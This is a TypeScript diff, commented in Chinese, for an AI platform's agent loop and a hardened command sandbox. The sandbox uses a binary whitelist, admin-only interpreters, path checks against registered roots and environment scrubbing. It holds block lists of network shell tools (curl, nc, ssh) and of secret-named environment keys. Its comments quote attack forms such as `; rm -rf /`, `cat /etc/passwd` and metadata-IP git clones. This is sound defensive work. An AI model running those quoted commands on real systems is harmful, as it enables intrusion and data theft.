+          const llmResp = await aiServiceSystemFetch('/api/llm/complete', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              messages: [
+                { role: 'system', content: `你是一个任务执行 Agent。目标: ${params.goal}` },
+                {
+                  role: 'user',
+                  content: `第 ${i + 1} 轮迭代，请思考下一步行动。已完成步骤: ${task.steps.map((s) => s.content).join('; ') || '无'}${injectionBlock}`,
+                },
+              ],
+              stream: false,
+            }),
+            signal: AbortSignal.timeout(60_000),
+          })
+          if (llmResp.ok) {
+            const llmData = (await llmResp.json()) as {
+              content?: string
+              choices?: { message?: { content: string } }[]
+            }
+            llmContent =
+              llmData.content ?? llmData.choices?.[0]?.message?.content ?? `第 ${i + 1} 轮思考完成`
+          } else {
+            llmError = `ai-service /api/llm/complete 返回 ${llmResp.status}`
+            llmContent = `[LLM 调用失败] ${llmError}`
+          }
+        } catch (e) {
+          llmError = `ai-service /api/llm/complete 调用异常: ${(e as Error).message}`
+          llmContent = `[LLM 调用失败] ${llmError}`
+        }
+        // F-306:上游失败时不得把「LLM 调用失败」写进助手轨迹/result —— 那会被消费方
+        // 当成一条正常产出(伪成功)。失败信息只落 task.error,steps/result 保持未产出。
+        if (llmError) break
+        task.steps.push({ iteration: i + 1, type: 'llm', content: llmContent })
+
+        // 工具调用登记（演示路径：只记轨迹、零执行。2026-10-26 摘掉"模拟执行腿"）
+        // 立因（守门 115 点名本文件原第 505 行 `tool.execute` 空参站点）：这一带此前用空对象
+        // 直接落到注册工具上，等于**结构上绕过工具入参校验** —— 而本 run 循环的 LLM 步骤产出的
+        // 是自由文本，全程没有任何结构化工具入参来源，于是空参执行必然打到有真实副作用的注册工具
+        // （write_file 落盘 / run_command 起子进程 / atomic_checkpoint 全栈快照）。
+        // 带校验的真执行出口只有一份：apps/cli 侧 shadowValidateToolArguments → validateToolArguments
+        // （AGENTS.md §0.6 单一真相源，本文件禁止自写第二把判据）；而 apps/api 既未依赖 @ihui/cli，
+        // `routes/workspace-ai.ts` 的 agentRunSchema 也只透传 `tools: string[]`（无入参面）。
+        // 所以演示路径的正解是"登记这次调用意图"，不是"替它执行一次"：轨迹两行（tool_call +
+        // tool_result）形态不变，内容显式声明未执行，消费方（GET /agent/tasks、web 面板）不受影响。
+        if (params.tools && params.tools.length > 0 && i === 0) {
+          const toolName = params.tools[0]!
+          const tool = this.tools.get(toolName)
+          if (tool) {
+            task.steps.push({
+              iteration: i + 1,
+              type: 'tool_call',
+              content: `登记工具调用 ${toolName}（未执行：本路径无结构化工具入参，不代为执行）`,
+              tool: toolName,
+            })
+            // 只登记不执行：这里**不得**调 tool.execute（空参形态既绕过入参校验，又会落到
+            // write_file 落盘 / run_command 起子进程这类有真实副作用的工具上）。结果行由本路径
+            // 自陈"未执行 + 为什么"，与上面那条 tool_call 成对，消费方形态不变。
+            task.steps.push({
+              iteration: i + 1,
+              type: 'tool_result',
+              content: `工具 ${toolName} 未执行：本路径无结构化工具入参，不代为执行（只登记调用意图）`,
+              tool: toolName,
+            })
+          }
+        }
+        task.result = llmContent
+        // 简化：单轮即完成（避免无限循环）
+        break
+      }
+      if (task.status !== 'canceled') {
+        // F-306:LLM 未真正返回内容时置 failed;completed 只属于真实产出的一轮。
+        if (llmError) {
+          task.status = 'failed'
+          task.error = llmError
+        } else {
+          task.status = 'completed'
+        }
+      }
+    } catch (e) {
+      task.status = 'failed'
+      task.error = (e as Error).message
+    }
+    // 终态即释放插话队列;任务本体按 TTL 由 pruneTerminalTasks 回收
+    this.injections.delete(taskId)
+    task.updatedAt = nowIso()
+    return task
+  }
+}
+
+export const agentLoop = new AgentLoopRuntime()
+
+// =============================================================================
+// 4. Sandbox — 沙箱执行环境（子进程隔离）
+// =============================================================================
+
+export type SandboxMode = 'read-only' | 'workspace-write' | 'danger-full-access'
+
+/**
+ * 2026-11-01 安全强化:git 在二进制白名单里,却**既不在 NETWORK_COMMANDS 也不在文件工具集**
+ * ⇒ 受限沙箱内 `git clone http://169.254.169.254/…`、`git ls-remote http://127.0.0.1:8830/admin`
+ * 既绕过整套 ssrf-guard(子进程自己发 DNS/TCP,守卫管不到),又把远端可控内容写到未检的参数路径。
+ * 这张表列的是"会主动出网/会写整目录"的 git 子命令;受限模式一律拒(danger-full-access 除外,
+ * 那一档的语义就是运维显式放开的完全访问)。
+ */
+const GIT_NETWORK_SUBCOMMANDS = new Set<string>([
+  'clone',
+  'fetch',
+  'pull',
+  'push',
+  'ls-remote',
+  'remote',
+  'submodule',
+  'archive',
+  'http-fetch',
+  'http-push',
+  'request-pull',
+  'credential',
+])
+
+/**
+ * 受限沙箱内 git 的"会出网"判据 —— **逐 token 判,不解析子命令位置**。
+ *
+ * 为什么不按"子命令位置"解析:git 的全局选项把值当**独立 token** 收
+ * (`git -C /tmp clone http://evil`),按"首个非旗标操作数"取会把 `/tmp` 当成子命令,
+ * 于是网络子命令被藏在旗标值后面绕过闸(这条是本轮用例实测出来的,不是设想)。
+ * 所以正解是失败方向收敛的那一侧:任一 token **逐字等于**网络子命令、或任一 token 带
+ * `scheme://` 形态的远端地址 ⇒ 拒。宁可多拦(合法的 `git log clone-notes.md` 这类
+ * 路径不会命中,因为要求整 token 相等),也绝不放过藏在旗标后面的形态。
+ */
+export function findGitEgressToken(tokens: string[]): string | null {
+  for (const t of tokens.slice(1)) {
+    if (!t) continue
+    const bare = t.includes('=') ? t.slice(t.indexOf('=') + 1) : t
+    if (GIT_NETWORK_SUBCOMMANDS.has(bare.toLowerCase())) return bare
+    if (/[a-z][a-z0-9+.-]*:\/\//i.test(t)) return t
+  }
+  return null
+}
+
+/**
+ * 沙箱执行超时归一(2026-11-01 安全强化)。
+ * `timeoutMs` 是客户端自报的 `z.number()`(路由层无上下界):NaN/负数原样传进 execFile
+ * 等价"永不超时"的挂死面,超大值则让一枚请求长期占住子进程槽。取不到合法数 ⇒ 用默认档,
+ * 不猜"调用者想要多长"。
+ */
+export function clampSandboxTimeout(raw: unknown, fallbackMs = 60000): number {
+  const n = Number(raw)
+  if (!Number.isFinite(n)) return fallbackMs
+  return Math.min(Math.max(Math.trunc(n), 1000), 120000)
+}
+
+/**
+ * 把一次沙箱子进程收成判定。
+ * 截止先到时不保留子进程退出码；没有数字退出码时也不编成 1。
+ */
+export function settleSandboxJob(input: {
+  timeoutMs: unknown
+  killed: unknown
+  code: unknown
+  stdout: unknown
+  stderr: unknown
+}): BoundedJobVerdict {
+  const deadlineSec =
+    typeof input.timeoutMs === 'number' && Number.isFinite(input.timeoutMs)
+      ? Math.floor(input.timeoutMs / 1000)
+      : input.timeoutMs
+  const sawLog = typeof input.stdout === 'string' || typeof input.stderr === 'string'
+  let finished: unknown
+  let exitCode: unknown
+  if (input.killed === true) {
+    finished = false
+    exitCode = null
+  } else if (typeof input.code === 'number' && Number.isInteger(input.code)) {
+    finished = true
+    exitCode = input.code
+  } else {
+    finished = input.killed === false ? true : input.killed
+    exitCode = input.code
+  }
+  return judgeBoundedSystemJob({
+    deadlineSec,
+    finished,
+    exitCode,
+    log: sawLog ? 'primary' : null,
+  })
+}
+
+const NETWORK_COMMANDS = [
+  'curl',
+  'wget',
+  'nc',
+  'netcat',
+  'ncat',
+  'ssh',
+  'scp',
+  'sftp',
+  'rsync',
+  'telnet',
+  'ftp',
+  'Invoke-WebRequest',
+  'Invoke-RestMethod',
+  'iwr',
+  'irm',
+]
+
+const SENSITIVE_ENV_KEYS = [
+  'API_KEY',
+  'SECRET',
+  'TOKEN',
+  'PASSWORD',
+  'PASSWD',
+  'CREDENTIAL',
+  'PRIVATE_KEY',
+  'AWS_',
+  'AZURE_',
+  'GCP_',
+  'OPENAI',
+  'ANTHROPIC',
+  'DATABASE_URL',
+  'REDIS_URL',
+  'SSH_AUTH',
+]
+
+const MAX_STDOUT = 5000
+const MAX_STDERR = 3000
+
+/**
+ * 沙箱白名单二进制(2026-07-21 安全审计加固)
+ *
+ * 仅允许执行以下工具集合,任何不在白名单内的命令被拒绝
+ * 防止用户通过 sandbox/execute 端点执行任意系统命令(RCE)
+ */
+/**
+ * 解释器族(2026-10-31 安全强化第 10 批 R8 复评 F1 收窄):node/python 等解释器
+ * 本质是"执行任意代码",其 -e/-c 代码串无法静态判读写面 —— 普通用户可先经
+ * /fs/write 在登记根内落脚本再执行,等价 RCE(读磁盘 .env 绕过 cleanEnv 的
+ * 环境净化、任意出网)。解释器命令现在仅 admin 可用;普通用户的代码块运行
+ * (code-block-run)按安全满分目标降级为非解释器命令面。
+ */
+const SANDBOX_INTERPRETER_BINARIES = new Set<string>([
+  'node',
+  'npm',
+  'pnpm',
+  'yarn',
+  'npx',
+  'python',
+  'python3',
+  'pip',
+  'pip3',
+  'tsc',
+  'eslint',
+  'prettier',
+  'vitest',
+  'jest',
+])
+
+/** 文件操作类(参数路径必须落登记根内;判据与 FSBridge.resolvePath 同源) */
+const SANDBOX_FILE_TOOL_BINARIES = new Set<string>([
+  'cat',
+  'head',
+  'tail',
+  'cp',
+  'mv',
+  'tee',
+  'touch',
+  'mkdir',
+  'rmdir',
+  'find',
+  'grep',
+  'rg',
+  'sed',
+  'awk',
+  'tar',
+  'zip',
+  'unzip',
+  'gzip',
+  'gunzip',
+  // 2026-11-01 安全强化:git 的操作数(clone 目标目录、--work-tree=、-C 等)同样是写面
+  'git',
+  // SDB-40:这几个只读列举/元信息命令与文件操作类同属"参数即路径"面,此前只在
+  // 二进制白名单里,`ls -R C:/Users`、`wc -l /etc/passwd`、`stat <外部路径>`、
+  // `test -f <外部路径>` 因此绕过路径收敛直接执行,把工作区外的目录树/存在性/
+  // 行数字节数回传给调用方。现统一并入本集合走同一套 isInsideRoot。
+  // `[` 是 test 的 POSIX 同义形态,不并进来等于留一条等价旁路。
+  'ls',
+  'dir',
+  'wc',
+  'stat',
+  'test',
+  '[',
+])
+
+/**
+ * SDB-40:这些命令的操作数**只**可能是路径(或 test/`[` 的表达式操作数),
+ * 不存在 grep/awk 那种"模式串也长得像路径"的参数形态,所以不能沿用
+ * "只有看起来像路径才校验"的过滤 —— `ls sub`、`wc -l a.txt` 这类不带
+ * `./` 前缀的相对路径会被 looksLikePath 跳过。这里改为:除开关项
+ * (以 `-` 开头)外,每个参数都按 cwd 相对/绝对路径收敛校验。
+ */
+const SANDBOX_OPERAND_ONLY_PATH_BINARIES = new Set<string>(['ls', 'dir', 'wc', 'stat', 'test', '['])
+
+const SANDBOX_BINARY_WHITELIST = new Set<string>([
+  'node',
+  'npm',
+  'pnpm',
+  'yarn',
+  'npx',
+  'git',
+  'ls',
+  'dir',
+  'pwd',
+  'cd',
+  'cat',
+  'head',
+  'tail',
+  'wc',
+  'find',
+  'grep',
+  'rg',
+  'awk',
+  'sed',
+  'echo',
+  'printf',
+  'tee',
+  'test',
+  'true',
+  'false',
+  '[',
+  '[[',
+  'mkdir',
+  'rmdir',
+  'cp',
+  'mv',
+  'touch',
+  'stat',
+  'tar',
+  'zip',
+  'unzip',
+  'gzip',
+  'gunzip',
+  'curl',
+  'wget',
+  'python',
+  'python3',
+  'pip',
+  'pip3',
+  'tsc',
+  'eslint',
+  'prettier',
+  'vitest',
+  'jest',
+])
+
+/**
+ * 简单 shell 解析器:把单行命令拆成 [binary, ...args]
+ * 支持单/双引号包裹的参数,引号内空格不被分割
+ * 不支持复杂语法(管道/重定向/变量展开/转义) → 一律拒绝
+ *
+ * 2026-07-21 安全审计加固:防止 `; rm -rf /` 类 shell 注入
+ */
+function parseShellCommand(command: string): string[] | null {
+  const trimmed = command.trim()
+  if (!trimmed) return null
+  // 拒绝任何 shell 元字符(管道/重定向/命令链/变量展开/子 shell)
+  // 允许的:字母数字、路径分隔符、空格、引号、点、横线、下划线、等号(仅限 --flag=val)、冒号
+  if (/[;|&$`<>(){}*?!\\]/.test(trimmed)) {
+    return null
+  }
+  const tokens: string[] = []
+  let cur = ''
+  let quote: '"' | "'" | null = null
+  for (let i = 0; i < trimmed.length; i++) {
+    const ch = trimmed[i]!
+    if (quote) {
+      if (ch === quote) {
+        quote = null
+      } else {
+        cur += ch
+      }
+      continue
+    }
+    if (ch === '"' || ch === "'") {
+      quote = ch
+      continue
+    }
+    if (ch === ' ' || ch === '\t') {
+      if (cur) {
+        tokens.push(cur)
+        cur = ''
+      }
+      continue
+    }
+    cur += ch
+  }
+  if (quote) return null // 未闭合的引号
+  if (cur) tokens.push(cur)
+  return tokens.length > 0 ? tokens : null
+}
+
+// =============================================================================
+// F-267 服务侧受控授权通道:依赖安装(自愈专用)
+// =============================================================================
+
+/**
+ * 固定 argv —— 调用方**传不了**任何参数,所以没有 `--prefix`/`-C`/`-g` 这类
+ * 改锚点、改落点、改网络面的开关位置。
+ *
+ * `--ignore-scripts` 不是可选项:依赖树里的 postinstall 是"装个包就执行任意代码"
+ * 的现成形状,自愈是在无人值守链路里跑的,不能让它替第三方包执行脚本。
+ */
+const DEPENDENCY_INSTALL_ARGV = ['install', '--ignore-scripts', '--no-frozen-lockfile'] as const
+
+/** 审计/展示用命令串:与 argv 同源拼出,不另写一份字面量 */
+export const DEPENDENCY_INSTALL_COMMAND = ['pnpm', ...DEPENDENCY_INSTALL_ARGV].join(' ')
+
+/**
+ * 显式授权标记:只允许自愈依赖修复这一条服务端内建链路填它。
+ * 它既不是 `isAdmin`(那是路由层按登录用户算的),也不会让 execute() 的解释器闸放行。
+ */
+export type DependencyInstallAuthorization = 'self-healing:dependency-repair'
+
+const DEPENDENCY_INSTALL_AUTHORIZATION: DependencyInstallAuthorization =
+  'self-healing:dependency-repair'
+
+const DEPENDENCY_INSTALL_TIMEOUT_MS = 300_000
+
+/** 可被 node 当模块加载的入口扩展名 —— npm_execpath 也可能指向 pnpm.exe 本体 */
+const NODE_LOADABLE_ENTRY_RE = /\.[cm]?js$/i
+
+/**
+ * 找 pnpm 的 JS 入口。判据与 `scripts/lib/npm-execpath.mjs` 同源:
+ * `npm_execpath` 不保证是 JS 入口(pnpm 11/Windows 下是 @pnpm/exe 的 exe 本体),
+ * 交给 node 直载会 `ERR_UNKNOWN_FILE_EXTENSION`;这里只接受两种可执行形态 ——
+ * 原生 exe 本体(直接跑)或 `.js/.cjs/.mjs` 入口(node 直载),**不开 shell**。
+ *
+ * 为什么需要候选表:API 可能被 `node dist/index.js` 拉起(此时 npm_execpath 为空),
+ * 而 Windows 上裸 `pnpm` 只是 `.cmd` shim,`execFile(shell:false)` 会直接 ENOENT。
+ */
+export function resolvePnpmLaunch(): { command: string; prefix: string[] } | null {
+  const execPathHint = process.env.npm_execpath
+  if (execPathHint && /\.exe$/i.test(execPathHint) && existsSync(execPathHint)) {
+    return { command: execPathHint, prefix: [] }
+  }
+  const nodeDir = dirname(process.execPath)
+  const candidates: string[] = []
+  if (execPathHint && NODE_LOADABLE_ENTRY_RE.test(execPathHint)) candidates.push(execPathHint)
+  const bases = [nodeDir, join(nodeDir, '..', 'lib')]
+  if (execPathHint) bases.push(dirname(execPathHint))
+  // PATH 上的安装目录:npm 全局布局是 <prefix>/node_modules/pnpm/bin/*
+  for (const dir of (process.env.PATH ?? '').split(delimiter)) {
+    const trimmed = dir.trim()
+    if (!trimmed) continue
+    bases.push(trimmed, join(trimmed, '..'))
+  }
+  for (const base of bases) {
+    candidates.push(join(base, 'node_modules', 'pnpm', 'bin', 'pnpm.mjs'))
+    candidates.push(join(base, 'node_modules', 'pnpm', 'bin', 'pnpm.cjs'))
+  }
+  for (const candidate of candidates) {
+    if (existsSync(candidate)) return { command: process.execPath, prefix: [candidate] }
+  }
+  return null
+}
+
+export interface DependencyInstallPlan {
+  args: string[]
+  cwd: string
+  timeout: number
+}
+
+/** 测试注入点:替换真实派生,plan.args 恒为固定 argv */
+export type DependencyInstallRun = (plan: DependencyInstallPlan) => Promise<{
+  stdout: string
+  stderr: string
+  exitCode: number | null
+}>
+
+class SandboxExecutor {
+  resolveMode(mode: string): SandboxMode {
+    const map: Record<string, SandboxMode> = {
+      'read-only': 'read-only',
+      readonly: 'read-only',
+      ro: 'read-only',
+      'workspace-write': 'workspace-write',
+      workspace_write: 'workspace-write',
+      write: 'workspace-write',
+      'danger-full-access': 'danger-full-access',
+      danger: 'danger-full-access',
+      full: 'danger-full-access',
+    }
+    const resolved = map[mode.trim().toLowerCase()]
+    if (!resolved) throw new Error(`未知沙箱模式: ${mode}`)
+    return resolved
+  }
+
+  isNetworkRestricted(mode: SandboxMode): boolean {
+    return mode !== 'danger-full-access'
+  }
+
+  checkNetworkCommand(command: string, mode: SandboxMode): boolean {
+    if (!this.isNetworkRestricted(mode)) return false
+    return NETWORK_COMMANDS.some((c) => command.toLowerCase().includes(c.toLowerCase()))
+  }
+
+  private cleanEnv(): NodeJS.ProcessEnv {
+    // 2026-10-31 安全强化第 10 批:danger-full-access 不再回传全量 process.env ——
+    // 此前任意登录用户自报该档即可把 JWT_SECRET/DATABASE_URL/上游 API Key 整袋端走。
+    // 该档现在只意味着"放行网络命令与写权限",敏感键在任何模式下都不进子进程环境。
+    const env: NodeJS.ProcessEnv = {}
+    for (const [key, val] of Object.entries(process.env)) {
+      if (val === undefined) continue
+      if (SENSITIVE_ENV_KEYS.some((s) => key.toUpperCase().includes(s))) continue
+      env[key] = val
+    }
+    return env
+  }
+
+  async execute(params: {
+    command: string
+    workspacePath: string
+    cwd?: string
+    mode?: SandboxMode
+    timeoutMs?: number
+    /** 2026-10-31 R8 复评 F1:解释器族仅 admin(路由层经 resolveAdminRoleId 判) */
+    isAdmin?: boolean
+  }): Promise<{
+    stdout: string
+    stderr: string
+    exitCode: number | null
+    mode: SandboxMode
+    backend?: 'remote'
+    truncated?: boolean
+  }> {
+    const mode = params.mode ?? 'workspace-write'
+    // 2026-10-31 安全强化第 10 批:登记根闸 —— workspacePath 与 cwd 都是客户端自报
+    // 字符串,不设闸则传 workspacePath="C:/" 让白名单内的 cat/cp/tee 直接指到服务器
+    // 任意文件。fail-closed:env 未登记任何根 ⇒ 一律拒绝(与 FSBridge 同语义同单源)。
+    const root = assertWithinRegisteredRoots(params.workspacePath, '工作区')
+    const cwd = params.cwd ? assertWithinRegisteredRoots(params.cwd, '执行目录') : root
+    // 2026-10-31 R8 复评 F1:cwd 不再允许指向另一个登记根(workspacePath 过权限
+    // 闸而 cwd 只过登记根闸 ⇒ 越过权限梯在未授权工作区执行)。
+    if (params.cwd && cwd !== root) {
+      return {
+        stdout: '',
+        stderr: '执行目录必须与工作区一致(不允许跨根执行)',
+        exitCode: 126,
+        mode,
+      }
+    }
+
+    if (this.checkNetworkCommand(params.command, mode)) {
+      return {
+        stdout: '',
+        stderr: `网络命令在 ${mode} 模式下被拦截`,
+        exitCode: 126,
+        mode,
+      }
+    }
+
+    // 远程沙箱后端(2026-11-20):只在显式配置时启用;登记根与网络命令两道本机闸仍先判
+    // (不因执行面外移而放宽)。二进制白名单/解释器闸属本机进程面,由远端自行负责。
+    const remote = resolveRemoteSandbox()
+    if (remote.enabled && remote.config) {
+      const result = await executeRemoteSandbox(remote.config, {
+        command: params.command,
+        workspacePath: params.workspacePath,
+        cwd,
+        mode,
+        timeoutMs: params.timeoutMs,
+      })
+      return { ...result, mode }
+    }
+
+    // 2026-07-21 安全审计加固:命令解析 + 二进制白名单 + execFile 替代 exec(shell)
+    // 风险:原实现 execAsync(params.command, { shell: powershell.exe }) 直接执行
+    // 用户输入 → 攻击者传入 `; rm -rf /` 或 PowerShell 命令 → 任意命令执行(RCE)
+    // 修复:解析命令为 argv,验证 binary 在白名单,用 execFile(无 shell)执行
+    const tokens = parseShellCommand(params.command)
+    if (!tokens) {
+      return {
+        stdout: '',
+        stderr: '命令包含非法字符(; | & $ < > ` 等 shell 元字符),或引号未闭合',
+        exitCode: 126,
+        mode,
+      }
+    }
+    const binary = tokens[0]!
+    if (!SANDBOX_BINARY_WHITELIST.has(binary)) {
+      return {
+        stdout: '',
+        stderr: `命令不在白名单内: ${binary}。仅允许: ${Array.from(SANDBOX_BINARY_WHITELIST).slice(0, 10).join(', ')}...`,
+        exitCode: 126,
+        mode,
+      }
+    }
+    // 2026-10-31 R8 复评 F1:解释器仅 admin(签名 params.isAdmin 由路由层传;
+    // 代码串无法静态判读写面,普通用户可先 /fs/write 落脚本再跑 ⇒ 等价 RCE)。
+    if (SANDBOX_INTERPRETER_BINARIES.has(binary) && !params.isAdmin) {
+      return {
+        stdout: '',
+        stderr: `解释器命令(${binary})仅管理员可用:普通账户可先写脚本再执行,等价任意代码执行`,
+        exitCode: 126,
+        mode,
+      }
+    }
+    // 2026-11-01 安全强化:git 的网络型子命令在受限档拒绝(见 GIT_NETWORK_SUBCOMMANDS 头注)。
+    // 判据顺序刻意排在"解释器仅 admin"之后、路径逐参数检查之前:先定"能不能出网",再定"写到哪"。
+    if (binary === 'git' && this.isNetworkRestricted(mode)) {
+      const offender = findGitEgressToken(tokens)
+      if (offender) {
+        return {
+          stdout: '',
+          stderr: `受限沙箱内禁止 git 的外连形态(${offender.slice(0, 60)}):该子命令会自行发起外连(ssrf-guard 覆盖不到子进程),远端内容还会写到参数路径`,
+          exitCode: 126,
+          mode,
+        }
+      }
+    }
+    // 2026-10-31 R8 复评 F1:文件操作类的路径参数必须落在登记根内(此前闸只判
+    // cwd,`cat /etc/passwd`、`tee /任意路径` 等参数路径原样通过)。逐参数
+    // realpathOrResolve + isInsideRoot,与 FSBridge.resolvePath 同判据。
+    if (SANDBOX_FILE_TOOL_BINARIES.has(binary)) {
+      // R9 复评 N1:`-` 前缀参数不再一刀切跳过 —— GNU 组合长选项
+      // (`cp x --target-directory=/外`、`tar --file=/外`)与短选项粘值
+      // (`grep -f/etc/passwd`)的路径 operands 曾全量漏网。取值规则:
+      //   · --flag=value 取 = 右侧;-f<value>(路径型短选项)取后缀;
+      //   · 纯旗标(-v/--verbose)跳过;裸路径参数照查。
+      const pathShortOptions = new Set(['f', 'C'])
+      // SDB-40:ls/dir/wc/stat/test 的操作数全是路径面,不做"看起来像路径"过滤
+      const checkAllOperands = SANDBOX_OPERAND_ONLY_PATH_BINARIES.has(binary)
+      for (const arg of tokens.slice(1)) {
+        if (!arg) continue
+        let candidate: string
+        if (arg.startsWith('--')) {
+          const eq = arg.indexOf('=')
+          if (eq <= 0) continue // --verbose 类纯旗标
+          candidate = arg.slice(eq + 1)
+        } else if (arg.startsWith('-') && arg.length > 2 && pathShortOptions.has(arg[1] ?? '')) {
+          candidate = arg.slice(2)
+        } else if (arg.startsWith('-')) {
+          continue
+        } else {
+          candidate = arg
+        }
+        if (!candidate) continue
+        // 路径形态:盘符(C:/ 或 C:\)、绝对(/ 或 \)、相对(./ 或 ../)。用 RegExp 构造避开字面量转义在评审工具链里的二次解释。
+        const looksLikePath = new RegExp(
+          '^([A-Za-z]:[/' +
+            String.fromCharCode(92) +
+            '/]|[/' +
+            String.fromCharCode(92) +
+            ']|\.\.?[/' +
+            String.fromCharCode(92) +
+            '/])',
+        ).test(candidate)
+        if (!looksLikePath && !checkAllOperands) continue
+        let abs: string
+        try {
+          abs = isAbsolute(candidate)
+            ? realpathOrResolve(candidate)
+            : realpathOrResolve(resolve(cwd, candidate))
+        } catch {
+          return { stdout: '', stderr: `参数路径无法解析: ${candidate}`, exitCode: 126, mode }
+        }
+        if (!isInsideRoot(abs, root)) {
+          return {
+            stdout: '',
+            stderr: `参数路径越界(仅允许工作区登记根内): ${candidate}`,
+            exitCode: 126,
+            mode,
+          }
+        }
+      }
+    }
+
+    const env = this.cleanEnv()
+    const timeout = clampSandboxTimeout(params.timeoutMs)
+
+    try {
+      // 用 execFile 替代 exec,绕过 shell 直接传递参数,无 shell 注入风险
+      const { stdout, stderr } = await new Promise<{ stdout: string; stderr: string }>(
+        (resolve, reject) => {
+          execFile(
+            binary,
+            tokens.slice(1),
+            { cwd, env, timeout, maxBuffer: 1024 * 1024, shell: false, windowsHide: true },
+            (err, out, errOut) => {
+              if (err) {
+                ;(err as Error & { stdout?: string; stderr?: string }).stdout = out
+                ;(err as Error & { stdout?: string; stderr?: string }).stderr = errOut
+                reject(err)
+                return
+              }
+              resolve({ stdout: out, stderr: errOut })
+            },
+          )
+        },
+      )
+      const verdict = settleSandboxJob({
+        timeoutMs: timeout,
+        killed: false,
+        code: 0,
+        stdout,
+        stderr,
+      })
+      return {
+        stdout: stdout.slice(0, MAX_STDOUT),
+        stderr: stderr.slice(0, MAX_STDERR),
+        exitCode: verdict.exitCode,
+        mode,
+      }
+    } catch (e) {
+      const err = e as Error & {
+        stdout?: string
+        stderr?: string
+        code?: unknown
+        killed?: unknown
+      }
+      const stderrText = err.stderr ?? err.message
+      const verdict = settleSandboxJob({
+        timeoutMs: timeout,
+        killed: err.killed,
+        code: err.code,
+        stdout: err.stdout,
+        stderr: stderrText,
+      })
+      return {
+        stdout: (err.stdout ?? '').slice(0, MAX_STDOUT),
+        stderr: String(stderrText ?? '').slice(0, MAX_STDERR),
+        exitCode: verdict.exitCode,
+        mode,
+      }
+    }
+  }
+
+  /**
+   * F-267:自愈依赖修复的**受控授权通道**(与 execute(command) 平行的另一条面)。
+   *
+   * 为什么不复用 execute:`pnpm` 在 SANDBOX_INTERPRETER_BINARIES 里,非 admin 一律
+   * 126(实测)。把 pnpm 摘出闸、或让服务端自报 isAdmin 都是削弱闸本体 —— 这里两个
+   * 都不做:execute() 的判定一字未改,本方法只承载"固定 argv 的服务端内建动作"。
+   *
+   * 控制点全在服务端:
+   *   ① 调用方传不了命令串 —— argv 由 DEPENDENCY_INSTALL_ARGV 写死(含
+   *      `--ignore-scripts`,不让依赖的 postinstall 在无人值守链路里执行任意代码);
+   *   ② 根归属 —— workspacePath 必须落在登记根内,且**自身就是包根**:package.json
+   *      在它下面,realpath 也仍在根内(防符号链接把安装锚点挪到根外);
+   *   ③ 显式授权 —— authorization 只接受自愈那条链路填的字面量;
+   *   ④ Windows 上裸 `pnpm` 是 .cmd shim,execFile(shell:false) 会 ENOENT,
+   *      故按 resolvePnpmLaunch() 用 node 直载 pnpm 的 JS 入口,全程不开 shell。
+   */
+  async installWorkspaceDependencies(params: {
+    workspacePath: string
+    authorization: DependencyInstallAuthorization
+    timeoutMs?: number
+    /** 测试注入点:替换真实派生(plan.args 恒为固定 argv,注入改不了它) */
+    run?: DependencyInstallRun
+  }): Promise<{ command: string; stdout: string; stderr: string; exitCode: number | null }> {
+    if (params.authorization !== DEPENDENCY_INSTALL_AUTHORIZATION) {
+      throw new Error(
+        `未授权的依赖安装调用:该通道仅限自愈依赖修复(authorization=${DEPENDENCY_INSTALL_AUTHORIZATION})`,
+      )
+    }
+    const root = assertWithinRegisteredRoots(params.workspacePath, '工作区')
+    const pkgReal = realpathOrResolve(join(root, 'package.json'))
+    if (!existsSync(pkgReal)) {
+      throw new Error('依赖安装目标不是包根:该目录下没有 package.json')
+    }
+    if (!statSync(pkgReal).isFile()) {
+      throw new Error('依赖安装目标的 package.json 不是普通文件,拒绝执行')
+    }
+    if (!isInsideRoot(pkgReal, root)) {
+      throw new Error('依赖安装目标的 package.json 落点越出工作区根(疑似符号链接逃逸)')
+    }
+
+    const rawTimeout = Number(params.timeoutMs)
+    const timeout = Number.isFinite(rawTimeout)
+      ? Math.max(1000, Math.trunc(rawTimeout))
+      : DEPENDENCY_INSTALL_TIMEOUT_MS
+    const plan: DependencyInstallPlan = { args: [...DEPENDENCY_INSTALL_ARGV], cwd: root, timeout }
+    const result = params.run ? await params.run(plan) : await this.spawnDependencyInstall(plan)
+    return {
+      command: DEPENDENCY_INSTALL_COMMAND,
+      stdout: String(result.stdout ?? '').slice(0, MAX_STDOUT),
+      stderr: String(result.stderr ?? '').slice(0, MAX_STDERR),
+      exitCode: result.exitCode,
+    }
+  }
+
+  /** 真实派生:node 直载 pnpm 的 JS 入口(或 npm_execpath 指向的 exe 本体),无 shell */
+  private async spawnDependencyInstall(
+    plan: DependencyInstallPlan,
+  ): Promise<{ stdout: string; stderr: string; exitCode: number | null }> {
+    const launch = resolvePnpmLaunch()
+    if (!launch) {
+      throw new Error(
+        '未找到 pnpm 可执行入口(既无 node 可直载的 JS 入口,也无 npm_execpath 指向的可执行文件):请在服务端安装 pnpm 或让它出现在 PATH 上',
+      )
+    }
+    try {
+      const { stdout, stderr } = await new Promise<{ stdout: string; stderr: string }>(
+        (resolveRun, rejectRun) => {
+          execFile(
+            launch.command,
+            [...launch.prefix, ...plan.args],
+            {
+              cwd: plan.cwd,
+              env: this.cleanEnv(),
+              timeout: plan.timeout,
+              maxBuffer: 1024 * 1024,
+              shell: false,
+              windowsHide: true,
+            },
+            (err, out, errOut) => {
+              if (err) {
+                ;(err as Error & { stdout?: string; stderr?: string }).stdout = out
+                ;(err as Error & { stdout?: string; stderr?: string }).stderr = errOut
+                rejectRun(err)
+                return
+              }
+              resolveRun({ stdout: out, stderr: errOut })
+            },
+          )
+        },
+      )
+      return { stdout, stderr, exitCode: 0 }
+    } catch (e) {
+      const err = e as Error & {
+        stdout?: string
+        stderr?: string
+        code?: unknown
+        killed?: unknown
+      }
+      const stderrText = err.stderr ?? err.message
+      const verdict = settleSandboxJob({
+        timeoutMs: plan.timeout,
+        killed: err.killed,
+        code: err.code,
+        stdout: err.stdout,
+        stderr: stderrText,
+      })
+      return {
+        stdout: err.stdout ?? '',
+        stderr: String(stderrText ?? ''),
+        exitCode: verdict.exitCode,
+      }
+    }
+  }
+}
+
+export const sandboxExecutor = new SandboxExecutor()
+
+// =============================================================================
+// 5. ComputerUse — 计算机操作（屏幕/键盘/鼠标模拟）
+// =============================================================================
+
+class ComputerUseService {
+  private enabled = process.env.IHUI_COMPUTER_USE_ENABLED === '1'
+  private lastOpTime = 0
+  private readonly minInterval = 200
+
+  isEnabled(): boolean {
+    return this.enabled && platform() === 'win32'
+  }
+
+  enable(): void {
